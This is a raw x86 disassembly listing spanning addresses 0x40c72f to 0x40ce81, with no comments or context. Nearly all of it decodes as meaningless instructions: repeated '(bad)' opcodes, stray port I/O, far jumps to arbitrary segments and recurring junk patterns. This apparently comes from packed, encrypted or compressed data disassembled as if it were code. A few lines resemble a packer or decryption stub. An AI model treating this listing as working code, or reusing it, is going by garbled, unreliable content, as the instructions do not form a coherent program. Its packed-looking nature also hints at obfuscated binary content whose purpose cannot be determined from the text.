  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	ds push dx
  40c743:	shl    BYTE PTR [esi],1
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c702
  40c74d:	push   0x65078424
  40c752:	fsubr  DWORD PTR [ecx+0x23]
  40c755:	in     eax,0x34
  40c757:	test   eax,0x164d1f18
  40c75c:	pop    ds
  40c75d:	vhaddps xmm4,xmm7,XMMWORD PTR [edi]
  40c761:	push   ecx
  40c762:	dec    ebx
  40c763:	jo     0x40c790
  40c765:	adc    BYTE PTR [edx+0x23],dl
  40c768:	test   bh,bh
  40c76a:	xor    esi,esi
  40c76c:	cli    
  40c76d:	push   ecx
  40c76e:	inc    eax
  40c76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c770:	add    DWORD PTR [edi+eax*2+0x23c0c57c],esp
  40c777:	cmp    DWORD PTR [edi],esi
  40c779:	xor    eax,0x24d0b61
  40c77e:	jne    0x40c7bc
  40c780:	mov    al,0xe5
  40c782:	xchg   esi,eax
  40c783:	repz (bad) 
  40c785:	in     al,dx
  40c786:	stos   BYTE PTR es:[edi],al
  40c787:	and    DWORD PTR [edi+0x34],ecx
  40c78a:	inc    esp
  40c78b:	add    al,BYTE PTR [esi-0x290c6733]
  40c791:	test   DWORD PTR [eax],edx
  40c793:	popa   
  40c794:	dec    edi
  40c795:	push   esp
  40c796:	sub    eax,0x7270afb6
  40c79b:	add    DWORD PTR [eax+0x7f4c592b],esi
  40c7a1:	outs   dx,DWORD PTR ds:[esi]
  40c7a2:	lea    edi,[ebp+ebx*1-0x58]
  40c7a6:	pusha  
  40c7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a8:	mov    WORD PTR [ebx-0x4d],es
  40c7ab:	push   ebp
  40c7ac:	sahf   
  40c7ad:	sbb    esp,eax
  40c7af:	and    BYTE PTR [edx+0x7295440c],bl
  40c7b5:	sar    BYTE PTR [ecx-0xa3fbea2],0x2
  40c7bc:	mov    esp,0xb8daf20c
  40c7c1:	in     al,dx
  40c7c2:	mov    ds:0xe2308821,eax
  40c7c7:	mov    bh,BYTE PTR [esi+0x20]
  40c7ca:	(bad)  
  40c7cb:	sbb    al,0x87
  40c7cd:	fwait
  40c7ce:	lahf   
  40c7cf:	xlat   BYTE PTR ds:[ebx]
  40c7d0:	sar    dl,0xd3
  40c7d3:	mov    ds:0xfa35b398,ax
  40c7d9:	push   edx
  40c7da:	fisub  DWORD PTR [edx+0x69493203]
  40c7e0:	inc    eax
  40c7e1:	retf   0x69d1
  40c7e4:	js     0x40c815
  40c7e6:	ret    
  40c7e7:	and    eax,0x32a85545
  40c7ec:	xchg   edi,eax
  40c7ed:	test   DWORD PTR [ebp+0x66],edi
  40c7f0:	inc    ebp
  40c7f1:	jg     0x40c81d
  40c7f3:	xchg   ebp,eax
  40c7f4:	sub    esp,esi
  40c7f6:	sbb    esi,DWORD PTR [ecx+0x4a]
  40c7f9:	sub    BYTE PTR [ecx],bl
  40c7fb:	sub    ch,bh
  40c7fd:	cmp    al,0x51
  40c7ff:	pop    esi
  40c800:	mov    edx,0x548d775a
  40c805:	test   eax,0xef4a7768
  40c80a:	xor    al,0xfb
  40c80c:	sbb    eax,0x49b316c7
  40c811:	pop    ebx
  40c812:	mov    bl,0xc5
  40c814:	mov    dl,0x7a
  40c816:	(bad)  
  40c817:	hlt    
  40c818:	pop    ebp
  40c819:	dec    eax
  40c81a:	xor    BYTE PTR [ecx+0x16204e22],al
  40c820:	add    eax,0x3a452324
  40c825:	in     eax,0x5d
  40c827:	sar    DWORD PTR [ebx+0x5d495993],0xcd
  40c82e:	test   BYTE PTR [esi-0x44],dl
  40c831:	and    DWORD PTR [ecx-0x774fcc58],0x42
  40c838:	sar    BYTE PTR [eax+0x6c],0x6d
  40c83c:	add    bh,BYTE PTR [edx]
  40c83e:	int    0x51
  40c840:	pop    ds
  40c841:	retf   0x9
  40c844:	sbb    dh,BYTE PTR [edx]
  40c846:	lahf   
  40c847:	sub    eax,0xe8fe0b90
  40c84c:	dec    ebx
  40c84d:	mov    ah,ch
  40c84f:	push   ebx
  40c850:	and    al,0xcb
  40c852:	sahf   
  40c853:	cmc    
  40c854:	out    0x90,al
  40c856:	mov    es,esp
  40c858:	push   0xffffffbe
  40c85a:	call   0x628a:0x90f48ad8
  40c861:	mov    ch,dh
  40c863:	lock push edx
  40c865:	ss mov ebx,0x715b3485
  40c86b:	xchg   esp,eax
  40c86c:	adc    esp,DWORD PTR [edi]
  40c86e:	adc    al,0x4e
  40c870:	test   al,0x51
  40c872:	loopne 0x40c849
  40c874:	dec    edi
  40c875:	lds    esi,FWORD PTR [ebx+0x5f]
  40c878:	ja     0x40c88c
  40c87a:	sub    bh,BYTE PTR [ebx+0x2]
  40c87d:	fcomp  QWORD PTR [ebp-0x19]
  40c880:	outs   dx,DWORD PTR ds:[esi]
  40c881:	(bad)  
  40c883:	push   ebp
  40c884:	stc    
  40c885:	push   cs
  40c886:	fst    QWORD PTR [ebx-0x4167286c]
  40c88c:	add    al,0x8b
  40c88e:	inc    ebp
  40c88f:	or     al,0x3
  40c891:	inc    ebp
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0xcd08869a
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c8fe
  40c8c7:	mov    es,WORD PTR [ecx+ecx*2]
  40c8ca:	jae    0x40c932
  40c8cc:	imul   ebp,DWORD PTR [edx+0x5d],0xf9f993e5
  40c8d3:	imul   edx,ebx,0x22
  40c8d6:	aam    0xb0
  40c8d8:	inc    eax
  40c8d9:	mov    dh,0xd9
  40c8db:	in     eax,0x96
  40c8dd:	and    esi,DWORD PTR [eax]
  40c8df:	sbb    BYTE PTR [edi+0x79],dl
  40c8e2:	xchg   BYTE PTR [edi+0x2b],dh
  40c8e5:	add    DWORD PTR [ebx+ebx*8+0x21780b23],eax
  40c8ec:	sub    eax,0x50c6d82
  40c8f1:	mov    bh,0x74
  40c8f3:	pop    ecx
  40c8f4:	pop    esp
  40c8f5:	or     ah,cl
  40c8f7:	dec    edx
  40c8f8:	sbb    al,0xf7
  40c8fa:	mov    WORD PTR [edi+0x4e131fa9],gs
  40c900:	xlat   BYTE PTR ds:[ebx]
  40c901:	adc    ah,BYTE PTR [ebx-0x35a6b572]
  40c907:	adc    al,0x53
  40c909:	(bad)  
  40c90a:	cli    
  40c90b:	fst    QWORD PTR [ecx+0x71]
  40c90e:	cmp    DWORD PTR [ecx],edx
  40c910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c911:	and    al,0xe9
  40c913:	jmp    0x303:0x8c8c35b0
  40c91a:	not    bh
  40c91c:	lods   al,BYTE PTR ds:[esi]
  40c91d:	sub    eax,0x99d22ef
  40c922:	cmp    al,0xf5
  40c924:	frstor [eax+eax*2-0x1e]
  40c928:	mov    dl,BYTE PTR [edi+0x417748f4]
  40c92e:	setne  dl
  40c931:	fcmovbe st,st(1)
  40c933:	fbstp  TBYTE PTR [eax]
  40c935:	call   0x1dde:0x7a1dbdd3
  40c93c:	cs and eax,0xd53460c7
  40c942:	or     esi,ecx
  40c944:	lds    esi,FWORD PTR [edi]
  40c946:	mov    ebx,0x5b1fd65b
  40c94b:	mov    dh,0xb7
  40c94d:	sbb    al,0x91
  40c94f:	in     eax,dx
  40c950:	mov    ah,0x9f
  40c952:	pop    ds
  40c953:	fisubr DWORD PTR [edi]
  40c955:	jle    0x40c9d6
  40c957:	push   edi
  40c958:	inc    eax
  40c959:	jecxz  0x40c905
  40c95b:	inc    eax
  40c95c:	cmp    ebp,DWORD PTR [eax-0x5321444f]
  40c962:	in     eax,0xbe
  40c964:	popf   
  40c965:	cmc    
  40c966:	lahf   
  40c967:	push   ebx
  40c968:	or     ebx,DWORD PTR [eax+edx*8+0x4a462833]
  40c96f:	pop    ds
  40c970:	push   edi
  40c971:	add    eax,0x6e01cd3f
  40c976:	sbb    BYTE PTR [ebx],al
  40c978:	push   ds
  40c979:	cmp    eax,0x1367c071
  40c97e:	fwait
  40c97f:	pop    edi
  40c980:	jmp    0xf4a7:0xad0f536f
  40c987:	sub    eax,0xc3c1cbef
  40c98c:	push   0x8c6692
  40c991:	push   eax
  40c992:	dec    esi
  40c993:	adc    ecx,eax
  40c995:	cs jle 0x40c98d
  40c998:	xor    bh,al
  40c99a:	cmp    ecx,eax
  40c99c:	adc    al,0x2d
  40c99e:	pop    cx
  40c9a0:	shl    DWORD PTR [ecx-0x5d],0xe2
  40c9a4:	ror    DWORD PTR [eax-0x7d34c1da],0xb3
  40c9ab:	push   es
  40c9ac:	sub    eax,edi
  40c9ae:	push   edi
  40c9af:	loope  0x40c9c0
  40c9b1:	sbb    BYTE PTR [edx-0x58f45478],dl
  40c9b7:	sub    BYTE PTR [edx-0x6d],0x49
  40c9bb:	jmp    0xe425:0x7f0031d
  40c9c2:	add    DWORD PTR [ebx],esp
  40c9c4:	mul    DWORD PTR [esp+edx*8-0x147d4a70]
  40c9cb:	out    dx,eax
  40c9cc:	push   ds
  40c9cd:	jne    0x40c9ee
  40c9cf:	adc    BYTE PTR ss:[edi],bh
  40c9d2:	sbb    al,0xf5
  40c9d4:	dec    esp
  40c9d5:	mov    eax,ds:0x4ef1dce
  40c9da:	pop    ecx
  40c9db:	shl    DWORD PTR [ebp+0x6],cl
  40c9de:	outs   dx,DWORD PTR ds:[esi]
  40c9df:	outs   dx,DWORD PTR ds:[esi]
  40c9e0:	cmp    BYTE PTR [edx-0x55],0xf
  40c9e4:	test   DWORD PTR [edx-0xcffe282],esp
  40c9ea:	mov    DWORD PTR [ebx+edx*8+0xf],eax
  40c9ee:	inc    edi
  40c9ef:	xchg   edi,eax
  40c9f0:	setnp  cl
  40c9f3:	pop    esi
  40c9f4:	adc    BYTE PTR [ecx+0x6],ch
  40c9f7:	jnp    0x40ca07
  40c9f9:	fsub   QWORD PTR [ebx+0x10]
  40c9fc:	pop    ecx
  40c9fd:	jne    0x40ca12
  40c9ff:	sub    eax,0xe84fdea6
  40ca04:	jp     0x40c9a2
  40ca06:	ds dec ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x445dcacf
  40ca1c:	pop    edi
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40c9b8
  40ca26:	ja     0x40ca39
  40ca28:	dec    ecx
  40ca29:	sub    esi,DWORD PTR [edx+ebx*2-0x42]
  40ca2d:	sub    DWORD PTR [ebp+0x71159efd],ebx
  40ca33:	loop   0x40c9dd
  40ca35:	add    DWORD PTR [edi-0x41],eax
  40ca38:	lds    esi,FWORD PTR [ebp+0x2b]
  40ca3b:	bound  edi,QWORD PTR [esi+0x25]
  40ca3e:	xchg   esi,eax
  40ca3f:	outs   dx,DWORD PTR ds:[esi]
  40ca40:	int3   
  40ca41:	test   BYTE PTR [edx+0x20],al
  40ca44:	rcl    ecx,1
  40ca46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca47:	dec    esi
  40ca48:	adc    al,0xf7
  40ca4a:	dec    eax
  40ca4b:	cmp    al,0xdd
  40ca4d:	(bad)  
  40ca4e:	test   DWORD PTR [esi+0x7f8025ae],ecx
  40ca54:	inc    edx
  40ca55:	js     0x40ca07
  40ca57:	or     ch,BYTE PTR [esi]
  40ca59:	mov    cl,BYTE PTR [ebx]
  40ca5b:	mov    esp,0x7dbaaa55
  40ca60:	mov    eax,ds:0x29ffdf9
  40ca65:	out    dx,al
  40ca66:	cmp    eax,0x1e2c2644
  40ca6b:	scas   eax,DWORD PTR es:[edi]
  40ca6c:	in     al,dx
  40ca6d:	add    BYTE PTR [ebx+eax*4],bl
  40ca70:	and    BYTE PTR ds:0xdf52282,dh
  40ca76:	sbb    dl,cl
  40ca78:	stos   DWORD PTR es:[edi],eax
  40ca79:	xor    DWORD PTR [ebx],esp
  40ca7b:	(bad)  
  40ca7d:	ins    BYTE PTR es:[edi],dx
  40ca7e:	dec    ebp
  40ca7f:	xchg   esp,eax
  40ca80:	xor    al,0x28
  40ca82:	mov    eax,0x895e5f66
  40ca87:	lods   eax,DWORD PTR ds:[esi]
  40ca88:	outs   dx,DWORD PTR ds:[esi]
  40ca89:	fs pop ss
  40ca8b:	jne    0x40ca48
  40ca8d:	and    BYTE PTR ds:0x5869b2d0,0xaf
  40ca94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca95:	add    dl,BYTE PTR [edx-0x57]
  40ca98:	ss mov ebp,esi
  40ca9b:	ins    DWORD PTR es:[edi],dx
  40ca9c:	or     eax,0x9229f103
  40caa1:	adc    DWORD PTR [edx+esi*2+0x73],0x48
  40caa6:	mov    edx,0xf026444a
  40caab:	cmp    esp,DWORD PTR [edi]
  40caad:	pop    eax
  40caae:	retf   0xc349
  40cab1:	pop    esp
  40cab2:	test   BYTE PTR [eax+0x23],0x21
  40cab6:	out    0xd7,eax
  40cab8:	jecxz  0x40cb24
  40caba:	and    DWORD PTR [esp+esi*1-0x2ee3689],edi
  40cac1:	push   edx
  40cac2:	sub    DWORD PTR [ebp-0x13],0x5229b473
  40cac9:	mov    dl,0x75
  40cacb:	jecxz  0x40ca87
  40cacd:	dec    ebx
  40cace:	mov    ebp,0x3bb24e9
  40cad3:	inc    eax
  40cad4:	xor    al,BYTE PTR [eax]
  40cad6:	xchg   edi,eax
  40cad7:	popf   
  40cad8:	xor    bh,BYTE PTR [eax+edx*2]
  40cadb:	aam    0xb0
  40cadd:	ret    0xbbf7
  40cae0:	ins    DWORD PTR es:[edi],dx
  40cae1:	mul    BYTE PTR [ecx+0x1f]
  40cae4:	xor    DWORD PTR [edx+edi*1+0x56f2deed],eax
  40caeb:	sbb    al,0x4e
  40caed:	dec    esp
  40caee:	sbb    DWORD PTR [eax-0x12],ebp
  40caf1:	das    
  40caf2:	jb     0x40ca8a
  40caf4:	and    cl,BYTE PTR [edx+0xe]
  40caf7:	ret    
  40caf8:	pushf  
  40caf9:	push   cs
  40cafa:	leave  
  40cafb:	inc    esi
  40cafc:	repz (bad) 
  40cafe:	xlat   BYTE PTR ds:[ebx]
  40caff:	popa   
  40cb00:	pop    esp
  40cb01:	adc    ah,BYTE PTR [edx-0xe]
  40cb04:	adc    eax,DWORD PTR [ebp-0x3bd10b8e]
  40cb0a:	add    ebx,ebx
  40cb0c:	lods   al,BYTE PTR ds:[esi]
  40cb0d:	lods   eax,DWORD PTR ds:[esi]
  40cb0e:	and    DWORD PTR [ecx-0x698068ec],0x14d15e48
  40cb18:	cmp    bl,BYTE PTR [ebx+0x7d]
  40cb1b:	mov    cs,edx
  40cb1d:	mov    esi,0xbfec292e
  40cb22:	dec    esi
  40cb23:	outs   dx,BYTE PTR ds:[esi]
  40cb24:	idiv   DWORD PTR [edx+0x5538760]
  40cb2a:	call   0x2830efa8
  40cb2f:	lods   al,BYTE PTR ds:[esi]
  40cb30:	mov    ds:0xadd000a5,al
  40cb35:	pusha  
  40cb36:	shl    BYTE PTR [edi+0x75],0x96
  40cb3a:	sub    ebp,DWORD PTR [edx+0xe]
  40cb3d:	cwde   
  40cb3e:	cdq    
  40cb3f:	into   
  40cb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb41:	ins    BYTE PTR es:[edi],dx
  40cb42:	pop    ds
  40cb43:	fstp   DWORD PTR [ecx]
  40cb45:	push   edx
  40cb46:	sub    BYTE PTR [esi+ecx*2],dl
  40cb49:	jne    0x40cae7
  40cb4b:	ins    DWORD PTR es:[edi],dx
  40cb4c:	add    WORD PTR [esi],si
  40cb4f:	test   BYTE PTR [esp+esi*8-0x5dfca838],cl
  40cb56:	nop
  40cb57:	fbstp  TBYTE PTR [edi]
  40cb59:	pushf  
  40cb5a:	stc    
  40cb5b:	adc    dh,BYTE PTR [edx]
  40cb5d:	js     0x40cb29
  40cb5f:	pop    ebx
  40cb60:	lahf   
  40cb61:	scas   eax,DWORD PTR es:[edi]
  40cb62:	(bad)  
  40cb63:	repz and DWORD PTR [esi+0x5b],ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb52
  40cb8b:	call   0xf64ac979
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cc14
  40cb97:	add    eax,DWORD PTR [ebp-0x3b]
  40cb9a:	daa    
  40cb9b:	sbb    al,0x7a
  40cb9e:	aad    0xbb
  40cba0:	xchg   ebx,eax
  40cba1:	jle    0x40cbbf
  40cba3:	add    al,0x6d
  40cba5:	xchg   BYTE PTR [edi-0x6ef6e084],ch
  40cbab:	iret   
  40cbac:	jge    0x40cbbb
  40cbae:	shr    BYTE PTR [ebp+eiz*8-0x78],0x16
  40cbb3:	popa   
  40cbb4:	loopne 0x40cbc0
  40cbb6:	xchg   esi,eax
  40cbb7:	repz lds edx,FWORD PTR [ebx+0x1d]
  40cbbb:	call   0x191c:0x9247dd7f
  40cbc2:	clc    
  40cbc3:	jae    0x40cbf8
  40cbc5:	jnp    0x40cb4c
  40cbc7:	mov    ebx,0x10b7b155
  40cbcc:	cmp    BYTE PTR [eax+0x1e],al
  40cbcf:	es (bad) 
  40cbd1:	std    
  40cbd2:	jae    0x40cbc2
  40cbd4:	fadd   QWORD PTR [esi-0x36]
  40cbd7:	loope  0x40cbd7
  40cbd9:	out    0xcb,eax
  40cbdb:	push   ebx
  40cbdc:	pop    esp
  40cbdd:	inc    edi
  40cbde:	punpckldq mm0,DWORD PTR [ebp+esi*1-0x59]
  40cbe3:	mov    ds:0xac0b16d5,al
  40cbe8:	push   ebp
  40cbe9:	sbb    ch,BYTE PTR [esi+eiz*2]
  40cbec:	push   0xfbb88e54
  40cbf1:	std    
  40cbf2:	adc    al,0x56
  40cbf4:	dec    ebp
  40cbf5:	mov    eax,0xba210f6e
  40cbfa:	or     edi,DWORD PTR [ecx-0x55]
  40cbfd:	not    DWORD PTR [ebp+0x5ef1a7a3]
  40cc03:	es jae 0x40cc7e
  40cc06:	int    0xbf
  40cc08:	adc    DWORD PTR [edi-0x167bbcfc],esp
  40cc0e:	xor    eax,0xcb3a31af
  40cc13:	sbb    BYTE PTR [ebx+0x7b],0x3
  40cc17:	sub    eax,0x3b63dd0
  40cc1c:	xor    eax,0xba8a6574
  40cc21:	jmp    FWORD PTR [ebp-0x6]
  40cc24:	sbb    ch,bl
  40cc26:	add    ebp,DWORD PTR [ebp-0x486c80d8]
  40cc2c:	stos   BYTE PTR es:[edi],al
  40cc2d:	cmp    BYTE PTR [esi-0x7c],0x2a
  40cc31:	mov    ecx,0x63a6f687
  40cc36:	xor    DWORD PTR [eax+0x7f],esi
  40cc39:	cmp    esp,DWORD PTR [eax+eax*1]
  40cc3c:	cmp    esi,DWORD PTR [edx+0x67]
  40cc3f:	and    eax,0x110a20ae
  40cc44:	ins    BYTE PTR es:[edi],dx
  40cc45:	scas   eax,DWORD PTR es:[edi]
  40cc46:	sub    DWORD PTR [ecx-0x262108c8],0xc97484b0
  40cc50:	test   eax,0xf9e43c36
  40cc55:	xor    DWORD PTR [edi+0xa],esp
  40cc58:	jne    0x40cbf7
  40cc5a:	cmc    
  40cc5b:	mov    ds:0xf8e5c629,eax
  40cc60:	jns    0x40cc5e
  40cc62:	xchg   esi,eax
  40cc63:	sub    ebp,DWORD PTR [ebx+0x2721f0d1]
  40cc69:	stc    
  40cc6a:	stos   DWORD PTR es:[edi],eax
  40cc6b:	pop    es
  40cc6c:	inc    ecx
  40cc6d:	retf   0xb691
  40cc70:	jb     0x40cbfd
  40cc72:	mov    bl,0x32
  40cc74:	xchg   esp,eax
  40cc75:	stos   DWORD PTR es:[edi],eax
  40cc76:	xchg   ecx,eax
  40cc77:	ret    
  40cc78:	gs push 0x99f1b7f5
  40cc7e:	ins    BYTE PTR es:[edi],dx
  40cc7f:	jbe    0x40cc71
  40cc81:	xor    eax,0x2dec89cd
  40cc86:	mov    edx,0x7cceb35c
  40cc8b:	mov    eax,ds:0x8d446c67
  40cc90:	lock cmp eax,0x75c78da6
  40cc96:	or     al,0x8f
  40cc98:	add    al,0xe8
  40cc9a:	mov    dh,BYTE PTR [ecx-0x14]
  40cc9d:	inc    eax
  40cc9e:	fisub  WORD PTR ds:0x8e747c3a
  40cca4:	sar    DWORD PTR [edi-0x887bf8f],cl
  40ccaa:	(bad)  [edi-0x70]
  40ccad:	lods   eax,DWORD PTR ds:[esi]
  40ccae:	js     0x40cd1a
  40ccb0:	pop    ecx
  40ccb1:	sbb    dh,ah
  40ccb3:	fistp  DWORD PTR [edx]
  40ccb5:	xlat   BYTE PTR ds:[ebx]
  40ccb6:	daa    
  40ccb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccb8:	push   0x54
  40ccba:	adc    al,0x40
  40ccbc:	pusha  
  40ccbd:	stos   DWORD PTR es:[edi],eax
  40ccbe:	or     eax,0x19ccf96b
  40ccc3:	(bad)  
  40ccc4:	mov    edx,0x46d04dd9
  40ccc9:	mov    WORD PTR [edx+edi*8+0x7bb49db2],cs
  40ccd0:	sbb    bl,cl
  40ccd2:	mov    BYTE PTR [edx-0x74c6bae4],0x45
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xe2ec1d3a
  40ccf1:	sar    eax,1
  40ccf3:	jecxz  0x40ccbf
  40ccf5:	idiv   DWORD PTR [esi+0x7e]
  40ccf8:	aas    
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40ccc2
  40ccfd:	fidivr DWORD PTR [edx]
  40ccff:	inc    ecx
  40cd00:	cmp    ah,al
  40cd02:	add    bl,BYTE PTR [esi-0x5c]
  40cd05:	xor    al,0x4c
  40cd07:	test   al,0xc4
  40cd09:	and    bh,BYTE PTR [ebp+0x15]
  40cd0c:	dec    ecx
  40cd0d:	dec    ebp
  40cd0e:	sub    DWORD PTR [eax+0x7c],edi
  40cd11:	xor    eax,0xe4828071
  40cd16:	in     al,0xe3
  40cd18:	mov    ch,0xef
  40cd1a:	jl     0x40cce9
  40cd1c:	cmp    ecx,ebx
  40cd1e:	aaa    
  40cd1f:	jbe    0x40cca4
  40cd21:	mov    al,0xe
  40cd23:	test   al,0x55
  40cd25:	and    ah,BYTE PTR [ebx+0x48]
  40cd28:	adc    eax,0xdd7c6188
  40cd2d:	ds push esp
  40cd2f:	hlt    
  40cd30:	test   eax,0xba3e7f9e
  40cd35:	sbb    eax,0x8dfe0e
  40cd3a:	xchg   edi,eax
  40cd3b:	pop    esp
  40cd3c:	imul   edi,DWORD PTR [esi-0x3caf3e4],0xffffff91
  40cd43:	xor    DWORD PTR [esi+0x5d],edi
  40cd46:	test   BYTE PTR [edx],bh
  40cd48:	inc    DWORD PTR [edi+esi*1-0x4cdefc1e]
  40cd4f:	push   edx
  40cd50:	dec    edi
  40cd51:	or     al,0xac
  40cd53:	inc    ebx
  40cd54:	rol    BYTE PTR [eax+0x6e],0x66
  40cd58:	cmp    ch,ah
  40cd5a:	mov    dl,cl
  40cd5c:	gs jno 0x40cdda
  40cd5f:	scas   al,BYTE PTR es:[edi]
  40cd60:	arpl   WORD PTR [ecx+0x55e59de2],bx
  40cd66:	mov    al,0x3b
  40cd68:	(bad)  
  40cd69:	jbe    0x40ccf0
  40cd6b:	push   esp
  40cd6c:	loope  0x40cd0c
  40cd6e:	push   ss
  40cd6f:	jae    0x40cd0e
  40cd71:	out    dx,al
  40cd72:	push   0x2f
  40cd74:	cli    
  40cd75:	jne    0x40cd07
  40cd77:	in     eax,0xb0
  40cd79:	dec    esi
  40cd7a:	push   ebp
  40cd7b:	cdq    
  40cd7c:	daa    
  40cd7d:	cli    
  40cd7e:	ja     0x40cd36
  40cd80:	mov    ecx,cs
  40cd82:	scas   eax,DWORD PTR es:[edi]
  40cd83:	(bad)  
  40cd85:	fnstsw WORD PTR [ebp-0x2be3d06]
  40cd8b:	push   edx
  40cd8c:	cdq    
  40cd8d:	or     DWORD PTR [eax-0x423f5c39],0x16
  40cd94:	inc    ebp
  40cd95:	or     cl,BYTE PTR [edx+0x23a64b47]
  40cd9b:	(bad)  
  40cd9c:	mov    eax,0x14408ed2
  40cda1:	xor    al,0x3b
  40cda3:	mov    edx,0xf2899d61
  40cda8:	out    0x21,eax
  40cdaa:	cmp    dh,0xad
  40cdad:	ficom  WORD PTR [edx+0x4e]
  40cdb0:	pop    ss
  40cdb1:	scas   al,BYTE PTR es:[edi]
  40cdb2:	mov    ebx,0x3894d5b4
  40cdb7:	jg     0x40cd8e
  40cdb9:	loope  0x40cdf1
  40cdbb:	pop    edx
  40cdbc:	and    al,0x80
  40cdbe:	imul   edi,ebx,0x4126f5b8
  40cdc4:	aas    
  40cdc5:	cmp    al,0x88
  40cdc7:	jge    0x40cd4d
  40cdc9:	arpl   WORD PTR [edx-0x4],ax
  40cdcc:	dec    ebx
  40cdcd:	(bad)  
  40cdce:	inc    DWORD PTR [eax]
  40cdd0:	dec    edi
  40cdd1:	or     ebx,ecx
  40cdd3:	jle    0x40ce4a
  40cdd5:	stos   BYTE PTR es:[edi],al
  40cdd6:	cmc    
  40cdd7:	xchg   edx,eax
  40cdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdd9:	iret   
  40cdda:	mov    cx,ax
  40cddd:	icebp  
  40cdde:	pusha  
  40cddf:	mov    gs,ebx
  40cde1:	sahf   
  40cde2:	cmp    DWORD PTR [esi-0x4f],0xffffffbf
  40cde6:	out    0xba,eax
  40cde8:	inc    eax
  40cdea:	leave  
  40cdeb:	lods   al,BYTE PTR ds:[esi]
  40cdec:	rcl    BYTE PTR [edx+0x73ff0748],0xc3
  40cdf3:	jnp    0x40cd9c
  40cdf5:	imul   eax,DWORD PTR [ebx-0x165be8b3],0x2e
  40cdfc:	pop    esp
  40cdfd:	lods   eax,DWORD PTR ds:[esi]
  40cdfe:	sub    BYTE PTR [edx+0x6dd0c579],0x69
  40ce05:	ins    DWORD PTR es:[edi],dx
  40ce06:	and    cl,ah
  40ce08:	cwde   
  40ce09:	xchg   ecx,eax
  40ce0a:	jbe    0x40ce83
  40ce0c:	jmp    0x51f9:0x9a36ff2d
  40ce13:	cmp    al,0x2
  40ce15:	pop    ebx
  40ce16:	mov    ds:0xc1c2e3ee,al
  40ce1c:	fstp   TBYTE PTR [esi-0x4e332195]
  40ce22:	shl    cl,cl
  40ce24:	sub    bl,al
  40ce26:	mov    cl,BYTE PTR [edi-0x3e]
  40ce29:	cmp    DWORD PTR [ecx],ebx
  40ce2b:	inc    ebx
  40ce2c:	retf   
  40ce2d:	retf   0x44e1
  40ce30:	popa   
  40ce31:	dec    edx
  40ce32:	sbb    al,BYTE PTR [esi+0x67]
  40ce35:	hlt    
  40ce36:	sub    al,BYTE PTR [esi+0x386b4bfb]
  40ce3c:	mov    dh,BYTE PTR [ebx]
  40ce3e:	sar    DWORD PTR [edx+0x32729d],0x3
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x5cdf5331,eax
  40ce59:	stc    
  40ce5a:	mov    ds:0x7e7e888b,eax
  40ce5f:	aas    
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ce6a
  40ce64:	cwde   
  40ce65:	popf   
  40ce66:	mov    eax,ds:0xa77e758c
  40ce6b:	icebp  
  40ce6c:	jge    0x40ce7a
  40ce6e:	mov    esi,0xa7a06a5f
  40ce73:	add    BYTE PTR [edx-0x127605e7],ch
  40ce79:	retf   
  40ce7a:	push   ebp
  40ce7b:	das    
  40ce7c:	mov    bl,ah
  40ce7e:	neg    eax
  40ce80:	pop    ss
  40ce81:	cmp    al,0x2e
